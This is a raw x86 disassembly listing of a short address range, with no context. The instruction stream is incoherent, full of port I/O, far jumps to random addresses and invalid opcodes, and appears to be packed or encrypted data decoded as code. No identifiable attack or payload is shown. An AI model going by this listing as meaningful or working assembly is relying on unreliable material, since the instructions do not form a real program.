  40390e:	and    bl,BYTE PTR [ebx+0x7adb83b1]
  403914:	cmp    cl,BYTE PTR [eax+0x5b699d03]
  40391a:	push   0x5a
  40391c:	jmp    0x40397a
  40391e:	xchg   ecx,eax
  40391f:	mov    ebx,ecx
  403921:	mov    esi,ecx
  403923:	sti    
  403924:	push   esi
  403925:	stos   BYTE PTR es:[edi],al
  403926:	js     0x403950
  403928:	out    dx,al
  403929:	outs   dx,DWORD PTR ds:[esi]
  40392a:	enter  0xf3fd,0xbc
  40392e:	aas    
  40392f:	in     eax,dx
  403930:	xchg   esp,eax
  403931:	inc    esi
  403932:	push   edi
  403933:	data16 test BYTE PTR [eax],al
  403936:	ret    
  403937:	lahf   
  403938:	out    dx,eax
  403939:	jge    0x4038d3
  40393b:	loopne 0x4038cb
  40393d:	mov    cl,0x73
  40393f:	call   0xc12d0eec
  403944:	or     esp,DWORD PTR [edi-0x73]
  403947:	rol    DWORD PTR [ecx-0x6afd6f1d],cl
  40394d:	dec    esp
  40394e:	enter  0xa24b,0x66
  403952:	das    
  403953:	pop    esi
  403954:	push   esi
  403955:	cmp    bh,BYTE PTR [edi]
  403957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403958:	out    dx,eax
  403959:	jne    0x4038e5
  40395b:	mov    esi,0xc2787d37
  403960:	and    edi,DWORD PTR [esi-0x4]
  403963:	ja     0x4039a7
  403965:	test   DWORD PTR [edi-0x4accca6d],ebx
  40396b:	ret    0x6430
  40396e:	fild   QWORD PTR [ebp-0x26b9cfe0]
  403974:	sub    DWORD PTR [ebp+0x3],0x8
  403978:	and    BYTE PTR [eax-0x43],ah
  40397b:	xor    ebx,DWORD PTR [edi]
  40397d:	mov    cl,0x5
  40397f:	fiadd  DWORD PTR [ecx]
  403981:	call   0x9489652b
  403986:	lods   eax,DWORD PTR cs:[esi]
  403988:	pop    ss
  403989:	inc    edi
  40398a:	lods   al,BYTE PTR ds:[esi]
  40398b:	gs out dx,eax
  40398d:	test   DWORD PTR gs:[ecx+0x5f],esi
  403991:	cmc    
  403992:	push   eax
  403993:	add    BYTE PTR [ecx],ch
  403995:	popa   
  403996:	mov    WORD PTR [edx+0x7c12f32f],ds
  40399c:	into   
  40399d:	mov    ds:0x731c4909,eax
  4039a2:	dec    esp
  4039a3:	mov    DWORD PTR ss:[edi-0x39ea9ae9],0x7f004e48
  4039ae:	push   esi
  4039af:	push   es
  4039b0:	sub    eax,0x79c27f1b
  4039b5:	sbb    eax,0x693522ff
  4039ba:	pushf  
  4039bb:	aaa    
  4039bc:	or     al,BYTE PTR [edx]
  4039be:	iret   
  4039bf:	jmp    0x8e9bb7e6
  4039c4:	retf   0x85a0
  4039c7:	lahf   
  4039c8:	out    dx,al
  4039c9:	add    DWORD PTR [ebx],esi
  4039cb:	adc    ebp,DWORD PTR [edi-0x6f]
  4039ce:	pop    esp
  4039cf:	mov    gs,WORD PTR [edx]
  4039d1:	fistp  DWORD PTR [edx]
  4039d3:	cmp    esi,esp
  4039d5:	gs sub dh,cl
  4039d8:	mov    ecx,0x93f200df
  4039dd:	jp     0xb44d9005
  4039e3:	jno    0x4039ca
  4039e5:	sti    
  4039e6:	fcomp  QWORD PTR [eax]
  4039e8:	sbb    cl,dl
  4039ea:	out    dx,al
  4039eb:	pop    esi
  4039ec:	test   DWORD PTR [ecx+ecx*8+0xfc9e5f2],ecx
  4039f3:	xchg   ebp,eax
  4039f4:	loope  0x403a64
  4039f6:	push   0x49df733a
  4039fb:	ins    DWORD PTR es:[edi],dx
  4039fc:	ret    0xa22d
  4039ff:	and    al,0x26
  403a01:	add    ebx,DWORD PTR [eax]
  403a03:	nop
  403a04:	mov    ebx,0xf6960170
  403a09:	pop    ss
  403a0a:	or     BYTE PTR [ecx-0x6d3da5e1],dl
  403a10:	xor    BYTE PTR [edx+0x292d92c7],cl
  403a16:	xchg   ebp,eax
  403a17:	and    ebx,esp
  403a19:	push   ss
  403a1a:	cmc    
  403a1b:	inc    esi
  403a1c:	xor    eax,0x6794feff
  403a21:	sub    eax,0x6edb864f
  403a26:	popa   
  403a27:	cmc    
  403a28:	imul   esi,DWORD PTR [edi],0xffffffb3
  403a2b:	push   ss
  403a2c:	sbb    bh,BYTE PTR [esi]
  403a2e:	jb     0x403a5f
  403a30:	fisub  WORD PTR [esi+ebx*2-0x5de00188]
  403a37:	out    0xbb,eax
  403a39:	cmp    esp,DWORD PTR ds:0x84917ccf
  403a3f:	call   0xe7ec539a
  403a44:	pop    edx
  403a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a46:	xlat   BYTE PTR ss:[ebx]
  403a48:	mov    edi,DWORD PTR [edx+0x20fd9fff]
  403a4e:	lahf   
  403a4f:	cs mov dl,0x1c
  403a52:	inc    edi
  403a53:	inc    ebp
  403a54:	sub    al,BYTE PTR [ebx-0x52086cf4]
  403a5a:	bound  ebp,QWORD PTR [esi]
  403a5c:	stos   DWORD PTR es:[edi],eax
  403a5d:	lods   eax,DWORD PTR ds:[esi]
  403a5e:	xor    al,0x89
  403a60:	mov    bl,0x3c
  403a62:	add    BYTE PTR [eax],dh
  403a64:	mov    ds:0xc21f0806,eax
  403a69:	in     eax,0x6
  403a6b:	call   0x73fd:0x78ff7e38
  403a72:	add    bh,BYTE PTR [edx+0x7]
  403a75:	lods   al,BYTE PTR ds:[esi]
  403a76:	aad    0x90
  403a78:	mov    bl,0xf2
  403a7a:	jecxz  0x403aaf
  403a7c:	or     cl,BYTE PTR [edx]
  403a7e:	jp     0x403a6e
  403a80:	push   ebx
  403a81:	test   bl,dh
  403a83:	lods   eax,DWORD PTR ds:[esi]
  403a84:	les    ecx,FWORD PTR [ebp+0x38]
  403a87:	outs   dx,DWORD PTR ds:[esi]
  403a88:	call   0x3eaa:0x32ebe4b1
  403a8f:	mov    esi,ds
  403a91:	lea    edx,[ebx+edi*2]
  403a94:	push   ss
  403a95:	cs ins BYTE PTR es:[edi],dx
  403a97:	mov    ebx,0x8ea92d54
  403a9c:	test   BYTE PTR [eax],0x31
  403a9f:	pop    edi
  403aa0:	mov    esp,0x5111443
  403aa5:	sbb    DWORD PTR [ecx+0x358243c0],ebx
  403aab:	pop    esi
  403aac:	jg     0x403af2
  403aae:	xor    dl,cl
  403ab0:	mov    ebp,0xaf4d0bfe
  403ab5:	ret    
  403ab6:	lods   eax,DWORD PTR ds:[esi]
  403ab7:	sbb    DWORD PTR [eax+0x6a],esp
  403aba:	cmovns eax,DWORD PTR [ebx-0x14]
  403abe:	or     ah,0xb1
  403ac1:	push   ebp
  403ac2:	or     BYTE PTR [edi-0x58b04b51],bh
  403ac8:	(bad)  [ecx]
  403aca:	dec    edx
  403acb:	iret   
  403acc:	xchg   esp,eax
  403acd:	and    ecx,DWORD PTR [eax]
  403acf:	retf   
  403ad0:	pop    ebx
  403ad1:	stos   BYTE PTR es:[edi],al
  403ad2:	xchg   ecx,eax
  403ad3:	cli    
  403ad4:	stos   BYTE PTR es:[edi],al
  403ad5:	test   eax,0x432401b3
  403ada:	pop    edi
  403adb:	xor    DWORD PTR [esi+0x2],eax
  403ade:	in     al,dx
  403adf:	sbb    BYTE PTR [eax-0x4b0162f0],bh
  403ae5:	lds    edi,FWORD PTR [ebx-0xdb9d2cb]
  403aeb:	add    edx,DWORD PTR [edx-0x7e]
  403aee:	xchg   BYTE PTR [eax+edx*2],ch
  403af1:	mov    eax,0x45c2d114
  403af6:	aam    0x5d
  403af8:	loope  0x403a9d
  403afa:	pop    esi
  403afb:	out    0x6b,eax
  403afd:	mov    DWORD PTR [ebp+0x2a],esp
  403b00:	sub    al,0x69
  403b02:	push   ecx
  403b03:	lods   eax,DWORD PTR ds:[esi]
  403b04:	js     0x403b53
  403b06:	mov    ah,0x76
  403b08:	sub    eax,0xb26525a9
  403b0d:	fwait
  403b0e:	dec    edx
  403b0f:	test   al,0xfb
  403b11:	or     eax,0xce7f3a65
  403b16:	lock push edx
  403b18:	fnsave [edi]
  403b1a:	xor    BYTE PTR [ecx-0x42],al
  403b1d:	data16 cli 
  403b1f:	jno    0x403b42
  403b21:	test   al,0x7c
  403b23:	sar    BYTE PTR ds:0x80449402,1
  403b29:	(bad)  
  403b2a:	into   
  403b2b:	pop    ecx
  403b2c:	jno    0x403b33
  403b2e:	cs mov esi,?
  403b31:	retf   0x3af4
  403b34:	sub    al,0x57
  403b36:	sahf   
  403b37:	and    BYTE PTR [edx],ah
  403b39:	stos   BYTE PTR es:[edi],al
  403b3a:	and    BYTE PTR [ecx+0x65f9ce73],0x31
  403b41:	and    cl,BYTE PTR [edi-0x240855fe]
  403b47:	jmp    0x3ad4a10
  403b4c:	shl    ah,0xbc
  403b4f:	test   BYTE PTR [edx-0x5ac4c110],0x6d
  403b56:	popa   
  403b57:	push   eax
  403b58:	jno    0x403bd1
  403b5a:	fisttp WORD PTR [edx+0x3a5d63ab]
  403b60:	ins    BYTE PTR es:[edi],dx
  403b61:	int3   
  403b62:	ds into 
  403b64:	sub    al,0x88
  403b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b67:	mov    esp,0x2524e49b
  403b6c:	mov    eax,0x38773ac0
  403b71:	pop    esi
  403b72:	push   ecx
  403b73:	push   ebx
  403b74:	mov    esi,0x6c633827
  403b79:	outs   dx,DWORD PTR ds:[esi]
  403b7b:	daa    
  403b7c:	sahf   
  403b7d:	add    DWORD PTR [ecx+0x2ae3159d],ebx
  403b83:	jnp    0x403b5d
  403b85:	out    dx,al
  403b86:	idiv   DWORD PTR [edx]
  403b88:	xor    BYTE PTR ds:0xe40cab0d,bh
  403b8e:	ins    DWORD PTR es:[edi],dx
  403b8f:	xor    DWORD PTR [eax+ebp*2-0x67e5e3a2],edx
  403b96:	leave  
  403b97:	jg     0x403bc3
  403b99:	lock xchg edi,eax
  403b9b:	jmp    0x403bd4
  403b9d:	int    0xc2
  403b9f:	fsubrp st(1),st
  403ba1:	xlat   BYTE PTR ds:[ebx]
  403ba2:	loop   0x403bba
  403ba4:	and    BYTE PTR [eax+ebx*8-0x72],dh
  403ba8:	push   edi
  403ba9:	out    0xd4,al
  403bab:	sbb    al,0x51
  403bad:	xlat   BYTE PTR ds:[ebx]
  403bae:	and    eax,0xca2cda7e
  403bb3:	aas    
  403bb4:	push   edx
  403bb5:	mov    eax,0x23e3259d
  403bba:	imul   ecx,edi,0xfffffff2
  403bbd:	cmp    ebp,esp
  403bbf:	jmp    0x403b58
  403bc1:	mov    ds:0x13db0ebd,eax
  403bc6:	fld    QWORD PTR [edx+0xabfbf5a]
  403bcc:	ja     0x403b7f
  403bce:	ss adc cl,bl
  403bd1:	sub    ebp,ebx
  403bd3:	and    eax,0x55f86735
  403bd8:	mov    al,ds:0x283a40da
  403bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bde:	sbb    esp,esi
  403be0:	fdivr  QWORD PTR [ebp+eiz*1+0x63]
  403be4:	push   edx
  403be5:	mov    ch,0xf
  403be7:	sub    eax,0x1681b181
  403bec:	jmp    0x403c53
  403bee:	in     al,dx
  403bef:	push   cs
  403bf0:	sub    al,0x2b
  403bf2:	in     eax,dx
  403bf3:	bnd jle 0x403beb
  403bf6:	xchg   dh,bh
  403bf8:	sub    eax,DWORD PTR [esi]
  403bfa:	in     eax,0x5a
  403bfc:	out    0xf2,eax
  403bfe:	add    bh,bh
  403c00:	xor    DWORD PTR [edi],ebx
  403c02:	jo     0x403bf2
  403c04:	dec    ebp
  403c05:	repz inc ecx
  403c07:	and    ebx,DWORD PTR [ecx+0x73]
  403c0a:	mov    dl,0x98
  403c0c:	(bad)  
  403c0d:	shl    DWORD PTR [edx-0x36],cl
  403c10:	idiv   DWORD PTR [eax+0x5cfd1eb7]
  403c16:	or     ch,cl
  403c18:	push   esi
  403c19:	fcmovnu st,st(3)
  403c1b:	mov    bl,0xd0
  403c1d:	push   ebx
  403c1e:	fiadd  DWORD PTR [esi-0x53284e2c]
  403c24:	pop    ebp
  403c25:	sub    BYTE PTR [ecx],0x86
  403c28:	mov    dl,0x71
  403c2a:	(bad)  
  403c2b:	sahf   
  403c2c:	jg     0x403c69
  403c2e:	jmp    0x1cc9:0xb674d09a
  403c35:	sub    ch,bh
  403c37:	and    BYTE PTR [ecx-0x4f],ch
  403c3a:	adc    al,0x41
  403c3c:	test   al,0x2
  403c3e:	pusha  
  403c3f:	adc    DWORD PTR [ebx],eax
  403c41:	adc    ah,BYTE PTR [ecx]
  403c43:	jp     0x403c55
  403c45:	mov    al,0x75
  403c47:	sub    ch,cl
  403c49:	lahf   
  403c4a:	push   es
  403c4b:	call   0xc7d598ca
  403c50:	push   ecx
  403c51:	add    eax,0xe5517735
  403c56:	push   ecx
  403c57:	mov    ds:0x2ae85e71,al
  403c5c:	out    dx,eax
  403c5d:	mov    ah,0x25
  403c5f:	popf   
  403c60:	mov    esi,0x555c01d4
  403c65:	js     0x403bea
  403c67:	xchg   ecx,eax
  403c68:	jne    0x403cd2
  403c6a:	mov    esi,0xe6954c2d
  403c6f:	xchg   esp,eax
  403c70:	int    0xe8
  403c72:	std    
  403c73:	xchg   ebx,eax
  403c74:	mov    al,ds:0x7475c56
  403c79:	jbe    0x403cd4
  403c7b:	add    DWORD PTR [ebp+0x31],esi
  403c7e:	loope  0x403c2c
  403c80:	clc    
  403c81:	and    eax,0x59ca4ae1
  403c86:	mov    eax,0x37ccbd6f
  403c8b:	out    dx,al
  403c8c:	fsubr  DWORD PTR [ecx-0x3a3f3fb8]
  403c92:	push   edx
  403c93:	mov    ch,0xb3
  403c95:	scas   eax,DWORD PTR es:[edi]
  403c96:	enter  0x67ea,0x9b
  403c9a:	mov    ebx,0xa6a1e8e9
  403c9f:	fs ins DWORD PTR es:[edi],dx
  403ca1:	popf   
  403ca2:	popa   
  403ca3:	gs push ebx
  403ca5:	cs mov ebx,0x478cb6f9
  403cab:	out    dx,eax
  403cac:	pop    ebp
  403cad:	cdq    
  403cae:	jo     0x403ce9
  403cb0:	inc    edi
  403cb1:	xchg   edx,eax
  403cb2:	inc    ebx
  403cb3:	jge    0x403c37
  403cb5:	test   BYTE PTR [ebx-0x40],0xce
  403cb9:	adc    ah,bh
  403cbb:	fwait
  403cbc:	or     DWORD PTR [eax-0x31],esp
  403cbf:	sahf   
  403cc0:	inc    edx
  403cc1:	dec    ecx
  403cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc3:	enter  0x46c6,0x95
  403cc7:	adc    eax,0x219e3b9a
  403ccc:	dec    ebx
  403ccd:	add    DWORD PTR [esi],esi
  403ccf:	rcl    BYTE PTR [eax],cl
  403cd1:	or     bl,BYTE PTR [edi]
  403cd3:	ins    DWORD PTR es:[edi],dx
  403cd4:	daa    
  403cd5:	pusha  
  403cd6:	mov    WORD PTR [esi+0x43],fs
  403cd9:	add    BYTE PTR [ebx+0x56],0x25
  403cdd:	aaa    
  403cde:	and    eax,0x71f13f6b
  403ce3:	bound  eax,QWORD PTR [ecx]
  403ce5:	mov    ah,0x74
  403ce7:	cmc    
  403ce8:	xchg   esi,eax
  403ce9:	sbb    eax,0xceaf1865
  403cee:	sbb    DWORD PTR [edi],esp
  403cf0:	jecxz  0x403cf8
  403cf2:	mov    bh,0x3
  403cf4:	mov    ebp,0xab003b89
  403cf9:	inc    eax
  403cfa:	pop    ss
  403cfb:	fcom   st(4)
  403cfd:	mov    dl,0x47
  403cff:	push   ss
  403d00:	push   edx
  403d01:	aam    0xf1
  403d03:	aaa    
  403d04:	or     BYTE PTR [edx],0x89
  403d07:	sub    al,al
  403d09:	mov    esi,0xe677db9d
  403d0e:	sti    
  403d0f:	std    
  403d10:	add    ebp,DWORD PTR [ebp-0x569a7768]
  403d16:	inc    esp
  403d17:	sahf   
  403d18:	mov    cl,BYTE PTR [eax+esi*4]
  403d1b:	test   al,0xd8
  403d1d:	call   0xb79cd8cb
  403d22:	push   eax
  403d23:	fidivr WORD PTR [esi]
  403d25:	sbb    esi,DWORD PTR [esi+edx*8+0x397cd316]
  403d2c:	mov    al,0xd8
  403d2e:	shr    DWORD PTR [ebx+0x76dbcd46],cl
  403d34:	scas   eax,DWORD PTR es:[edi]
  403d35:	cmc    
  403d36:	fdiv   QWORD PTR [esi]
  403d38:	adc    dh,BYTE PTR [ebx-0x61]
  403d3b:	hlt    
  403d3c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  403d3e:	pusha  
  403d3f:	sbb    BYTE PTR [edx+0x7acd5fa7],ch
  403d45:	mov    esi,0xc0f606d8
  403d4a:	jg     0x403d1f
  403d4c:	sub    BYTE PTR [ebp-0x5f6cb878],bl
  403d52:	jp     0x403d28
  403d54:	and    eax,0xcca45fe3
  403d59:	inc    edi
  403d5a:	mov    BYTE PTR [edx],bl
  403d5c:	add    eax,ebp
  403d5e:	lods   eax,DWORD PTR ds:[esi]
  403d5f:	ror    ch,1
  403d61:	ret    0xb18e
  403d64:	call   0x1d07:0x116acaec
  403d6b:	in     al,0x49
  403d6d:	arpl   WORD PTR [eax],bp
  403d6f:	lods   al,BYTE PTR ds:[esi]
  403d70:	jmp    DWORD PTR [ebx-0x406e35c5]
  403d76:	push   ebx
  403d77:	imul   edx,eax,0x78
  403d7a:	hlt    
  403d7b:	icebp  
  403d7c:	ret    0xed9f
  403d7f:	mov    dl,0xf2
  403d81:	test   esp,ebx
  403d83:	das    
  403d84:	iret   
  403d85:	push   ebp
  403d86:	sbb    BYTE PTR [ebx+0x5c],cl
  403d89:	icebp  
  403d8a:	inc    ecx
  403d8b:	push   ebx
  403d8c:	in     eax,0x51
  403d8e:	mov    dh,0x75
  403d90:	push   0x7c
  403d92:	add    ebx,ecx
  403d94:	adc    al,0x80
  403d96:	loop   0x403dcf
  403d98:	add    eax,0xab3b50ba
  403d9d:	push   0x5894f2b3
  403da2:	jge    0x403dfa
  403da4:	sti    
  403da5:	cmc    
  403da6:	stos   DWORD PTR es:[edi],eax
  403da7:	fdivr  QWORD PTR [ebp-0x67]
  403daa:	dec    ebx
  403dab:	je     0x403d97
  403dad:	pop    eax
  403dae:	fnstsw WORD PTR [esi+0x1c]
  403db1:	(bad)  [ecx+edx*8+0x48]
  403db5:	lods   eax,DWORD PTR ds:[esi]
  403db6:	xlat   BYTE PTR ds:[ebx]
  403db7:	in     al,0x90
  403db9:	cmc    
  403dba:	hlt    
  403dbb:	sub    al,0x39
  403dbd:	xlat   BYTE PTR ds:[ebx]
  403dbe:	push   edx
  403dbf:	xor    ch,BYTE PTR [ebp+0x16eee7ba]
  403dc5:	xchg   BYTE PTR [esi+0x2e3ba756],ch
  403dcb:	daa    
  403dcc:	pop    esi
  403dcd:	push   cs
  403dce:	(bad)  
  403dd0:	pusha  
  403dd1:	xor    BYTE PTR [eax+0xc6b7fc2],bl
  403dd7:	or     BYTE PTR [eax+0x7d],cl
  403dda:	jp     0x403d62
  403ddc:	push   esi
  403ddd:	sub    BYTE PTR [ebp-0x10000c98],dh
  403de3:	xor    BYTE PTR [ebx+0x42],ch
  403de6:	leave  
  403de7:	cmp    esi,DWORD PTR [esi]
  403de9:	mov    es,ecx
  403deb:	ret    
  403dec:	cld    
  403ded:	cmp    BYTE PTR [ebx+0x1f],al
  403df0:	xchg   edi,eax
  403df1:	std    
  403df2:	pop    esi
  403df3:	sbb    esi,DWORD PTR [ebx]
  403df5:	inc    ecx
  403df6:	sbb    ah,dl
  403df8:	fstp   DWORD PTR [eax]
  403dfa:	inc    esp
  403dfb:	push   0xbd28319e
  403e00:	mov    eax,0xdc90ce46
  403e05:	adc    ch,al
  403e07:	test   BYTE PTR [edx],cl
  403e09:	dec    edi
  403e0a:	in     al,0x22
  403e0c:	mov    ds:0x67fd2c40,al
  403e11:	xchg   ecx,eax
  403e12:	sbb    al,0xb2
  403e14:	push   eax
  403e15:	sub    eax,0x853aeb83
  403e1a:	and    edi,DWORD PTR [edx-0x44]
  403e1d:	hlt    
  403e1e:	mov    DWORD PTR [ebp-0x7b],esp
  403e21:	shl    BYTE PTR ds:0x5235170b,0x76
  403e28:	pop    ecx
  403e29:	das    
  403e2a:	scas   eax,DWORD PTR es:[edi]
  403e2b:	mov    eax,ebx
  403e2d:	adc    BYTE PTR [edi+0x4b],dl
  403e30:	dec    esp
  403e31:	cld    
  403e32:	mov    bh,0xda
  403e34:	dec    ebp
  403e35:	mov    dh,BYTE PTR [eax]
  403e37:	sub    eax,0x6d252aa4
  403e3c:	sub    eax,0x4b8ad3a6
  403e41:	and    dh,bl
  403e43:	shr    ah,1
  403e45:	hlt    
  403e46:	sbb    BYTE PTR [esi-0x4e7c71ae],ah
  403e4c:	test   cl,ah
  403e4e:	aas    
  403e4f:	popf   
  403e50:	(bad)  
  403e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e52:	shr    BYTE PTR [ecx+0x14],cl
  403e55:	bound  ebp,QWORD PTR [ebx+0x7ae6e064]
  403e5b:	cmp    edx,DWORD PTR [edx+edi*2+0x1b]
  403e5f:	lahf   
  403e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e61:	fbld   TBYTE PTR [edx+eiz*2-0xa99dafb]
  403e68:	out    dx,al
  403e69:	cmc    
  403e6a:	sub    DWORD PTR [edi],0xc0e8f509
  403e70:	add    al,bl
  403e72:	jnp    0x403ecc
  403e74:	retf   
  403e75:	inc    esi
  403e76:	sbb    BYTE PTR es:[edi-0x56],bh
  403e7a:	mov    ebx,0xd26826dd
  403e7f:	add    BYTE PTR [ebp+0x5f7bcd1d],0x64
  403e86:	mov    eax,0x8bd384dd
  403e8b:	iret   
  403e8c:	adc    DWORD PTR [eax],edi
  403e8e:	add    bh,0x65
  403e91:	into   
  403e92:	ins    BYTE PTR es:[edi],dx
  403e93:	popf   
  403e94:	sub    al,0xbf
  403e96:	cs or  al,0x6c
  403e99:	xor    BYTE PTR [edi+eiz*2-0x2e742f5b],ch
  403ea0:	iretw  
  403ea2:	mov    eax,0x3a29b579
  403ea7:	push   esi
  403ea8:	loopne 0x403e6a
  403eaa:	push   edi
  403eab:	icebp  
  403eac:	adc    al,0x28
  403eae:	mov    dh,BYTE PTR [edi-0x69cec5e0]
  403eb4:	xor    ebx,ecx
  403eb6:	xchg   ebp,eax
  403eb7:	scas   al,BYTE PTR es:[edi]
  403eb8:	adc    eax,0xcce5279e
  403ebd:	fisubr WORD PTR [ecx]
  403ebf:	jb     0x403e92
  403ec1:	jp     0x403ea7
  403ec3:	add    cl,BYTE PTR [esi+0x27]
  403ec6:	jmp    0xfcc88d21
  403ecb:	div    DWORD PTR [esi-0x13]
  403ece:	or     al,0x2c
  403ed0:	inc    esp
  403ed1:	sub    ecx,DWORD PTR [ebp+eax*8+0x7a]
  403ed5:	sbb    DWORD PTR [ecx],edi
  403ed7:	cmp    edi,DWORD PTR [edx+0x5d]
  403eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403edb:	and    eax,0x8bddfce1
  403ee0:	vmread eax,eax
  403ee3:	sub    BYTE PTR [edx-0x25],cl
  403ee6:	or     al,0x4f
  403ee8:	mov    ch,0xc9
  403eea:	mov    esi,0x4409357
  403eef:	jno    0x403f47
  403ef1:	imul   edi,DWORD PTR [edi],0x2e9907e1
  403ef7:	fisttp WORD PTR [eax+esi*8+0x29]
  403efb:	add    DWORD PTR [esi+0x62],esp
  403efe:	dec    ebx
  403eff:	push   edx
  403f00:	xor    DWORD PTR [ebx+0x5e],ecx
  403f03:	cld    
  403f04:	sbb    DWORD PTR [edx-0x25c71f29],edx
  403f0a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f0c:	loop   0x403f67
  403f0e:	mov    edx,0x378874bb
  403f13:	fmul   QWORD PTR [ebx+0x23]
  403f16:	nop
  403f17:	push   ebx
  403f18:	mov    dl,0x12
  403f1a:	push   edi
  403f1b:	call   0xa7dd:0x3db2aa29
  403f22:	push   0xffffff8d
  403f24:	mov    esp,0x67d963c9
  403f29:	dec    ebp
  403f2a:	call   0x90c:0xebb13fea
  403f31:	fisttp WORD PTR [edi-0x17]
  403f34:	sub    ecx,ebx
  403f36:	imul   cl
  403f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f39:	and    dh,ch
  403f3b:	mov    edx,0xb43c1f86
  403f40:	jmp    0x32de525d
  403f45:	adc    DWORD PTR [ecx],esi
  403f47:	xor    ch,ch
  403f49:	(bad)
  403f4d:	mov    edx,0x932f820b
  403f52:	stc    
  403f53:	aam    0x28
  403f55:	std    
  403f56:	jbe    0x403ee7
  403f58:	xor    DWORD PTR [edi+0x3409cd5a],ebp
  403f5e:	fdiv   st,st(0)
  403f60:	cli    
  403f61:	pop    dx
  403f63:	aaa    
  403f64:	push   0x9d8b606c
  403f69:	jno    0x403f0e
  403f6b:	pop    ebp
  403f6c:	dec    edi
  403f6d:	lea    ecx,[edx-0x5b]
  403f70:	data16 jl 0x403f75
  403f73:	jmp    0x48e93ba5
  403f78:	sbb    ch,BYTE PTR [ebp+0x1b0cff99]
  403f7e:	aas    
  403f7f:	pop    esp
  403f80:	mov    esp,0x3f89f8c1
  403f85:	pop    ds
  403f86:	inc    eax
  403f87:	enter  0x3d60,0x9a
  403f8b:	mov    esi,0x5acc8d23
  403f90:	push   edi
  403f91:	pop    esp
  403f92:	push   ebx
  403f93:	or     BYTE PTR [ecx+ebx*4],dh
  403f96:	mov    esp,0xf7550c0a
  403f9b:	sub    esi,eax
  403f9d:	out    dx,al
  403f9e:	and    al,0xc7
  403fa0:	pop    ebx
  403fa1:	(bad)  
  403fa2:	push   esi
  403fa3:	mov    al,ds:0x4fb2dcaf
  403fa8:	fwait
  403fa9:	and    al,0xa4
  403fab:	mov    eax,ds:0xcebbf3aa
  403fb0:	or     dl,0xa9
  403fb3:	fistp  WORD PTR [edi+0x72b56168]
  403fb9:	sub    al,0x9b
  403fbb:	test   BYTE PTR ds:0x84ba0b63,bl
  403fc1:	inc    esp
  403fc2:	mov    ecx,0x29e3153e
  403fc7:	cwde   
  403fc8:	xor    al,0x25
  403fca:	or     DWORD PTR [ecx+0x753bafcb],ebp
  403fd0:	lock arpl WORD PTR [esi+0x57437fb4],dx
  403fd7:	cwde   
  403fd8:	es popa 
  403fda:	cmp    ebp,DWORD PTR [ebx*4+0x49830a0d]
  403fe1:	adc    BYTE PTR [ecx+esi*8+0x528fd1da],bl
  403fe8:	aam    0x36
  403fea:	xor    BYTE PTR [ebx],dl
  403fec:	js     0x404061
  403fee:	iret   
  403fef:	or     BYTE PTR [ebp+ecx*8+0x6f],bl
  403ff3:	cld    
  403ff4:	jns    0x404054
  403ff6:	xor    esp,edx
  403ff8:	mov    es,WORD PTR [esi+edi*8+0x77]
  403ffc:	jmp    0x7cc0e0cb
  404001:	xor    ebp,DWORD PTR [ebp-0x4e]
  404004:	push   edi
  404005:	sti    
  404006:	pop    eax
  404007:	push   es
  404008:	xchg   ebp,eax
  404009:	adc    al,0x7c
  40400b:	gs out 0x66,al
  40400e:	jmp    0xd15a91f4
  404013:	cmp    BYTE PTR [eax-0x5d18d241],0x16
  40401a:	jle    0x403f9d
  40401c:	or     eax,0xbb90c742
  404021:	test   eax,0xb0f96833
  404026:	mov    dh,0xa0
  404028:	std    
  404029:	test   BYTE PTR [ebp+ecx*8+0x53ae5813],bh
  404030:	adc    al,0xb2
  404032:	pop    ebp
  404033:	xchg   DWORD PTR [eax+0x2f64189],esp
  404039:	test   BYTE PTR [eax],dh
  40403b:	or     ecx,DWORD PTR [edi-0x49]
  40403e:	inc    ebp
  40403f:	dec    edi
  404040:	jp     0x40403a
  404042:	ficomp WORD PTR [esi+0x29]
  404045:	xchg   ebp,eax
  404046:	adc    al,0x1d
  404048:	fwait
  404049:	jo     0x4040b4
  40404b:	icebp  
  40404c:	ins    BYTE PTR es:[edi],dx
  40404d:	mov    al,0x2b
  40404f:	(bad)  
  404050:	hlt    
  404051:	imul   ebx,DWORD PTR [edi],0xc0443f3e
  404057:	inc    esi
  404058:	mov    dl,0x80
  40405a:	jl     0x40403f
  40405c:	or     dh,BYTE PTR [ebx-0x74]
  40405f:	pop    ecx
  404060:	lock dec edx
  404062:	sub    DWORD PTR [ebx+edx*4],edi
  404065:	push   ebx
  404066:	mov    ds:0x6a14769,eax
  40406b:	dec    ebx
  40406c:	loopne 0x404042
  40406e:	clc    
  40406f:	xchg   BYTE PTR [eax+0x2],ah
  404072:	out    0xde,al
  404074:	add    eax,0x907e6877
  404079:	shl    BYTE PTR [edi-0xb],1
  40407c:	stos   DWORD PTR es:[edi],eax
  40407d:	repnz push ss
  40407f:	scas   eax,DWORD PTR es:[edi]
  404080:	sbb    DWORD PTR [esi+edx*8+0x1c],ecx
  404084:	sub    DWORD PTR [di+0x543b],ecx
  404089:	push   edx
  40408a:	mov    ebp,0xe38e2863
  40408f:	in     eax,0xa4
  404091:	mov    ebp,eax
  404093:	rcl    DWORD PTR [esi+0x6f],1
  404096:	addr16 out 0x9c,al
  404099:	repz stc 
  40409b:	mov    esi,0x43001b0a
  4040a0:	xlat   BYTE PTR ds:[ebx]
  4040a1:	ins    DWORD PTR es:[edi],dx
  4040a2:	push   ecx
  4040a3:	mov    dl,0xd6
  4040a5:	lods   eax,DWORD PTR ds:[esi]
  4040a6:	clc    
  4040a7:	ret    0x4d81
  4040aa:	mov    edi,0x35c4732
  4040af:	dec    DWORD PTR ds:0x22fbef91
  4040b5:	loope  0x4040e2
  4040b7:	jae    0x404115
  4040b9:	stos   BYTE PTR es:[edi],al
  4040ba:	in     eax,dx
  4040bb:	les    esp,FWORD PTR [edi-0x3d9bf675]
  4040c1:	mov    bh,0x3e
  4040c3:	aad    0x9b
  4040c5:	fwait
